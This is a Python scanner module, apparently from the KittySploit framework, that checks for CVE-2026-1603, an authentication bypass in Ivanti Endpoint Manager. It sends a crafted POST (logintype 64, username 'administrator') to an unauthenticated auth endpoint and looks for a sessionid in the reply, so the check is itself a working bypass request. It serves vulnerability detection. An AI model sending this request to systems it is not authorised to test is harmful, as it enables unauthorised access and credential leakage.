#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ivanti Endpoint Manager < 2024 SU5 contains an authentication bypass caused by improper access control, lettin."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ivanti Endpoint Manager - Authentication Bypass Detection',
        'description': 'Ivanti Endpoint Manager < 2024 SU5 contains an authentication bypass caused by improper access control, letting remote unauthenticated attackers leak stored credential data, exploit requires no special privileges.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'api', 'auth', 'ivanti', 'epmm', 'authbypass', 'vkev', 'kev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://x.com/watchtowrcyber/status/2022305033086235108/photo/1',
            'https://hub.ivanti.com/s/article/Security-Advisory-EPM-February-2026-for-EPM-2024',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-1603',
        ],
        'cve': 'CVE-2026-1603',
    }

    def run(self):
        path = '/RemoteControlAuth/api/Auth'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{\n    "logintype":"64",\n    "username":"administrator"\n}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('"sessionid":', '"sessionid": null',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='Ivanti Endpoint Manager - Authentication Bypass detected', path=path)
            return True
        return False

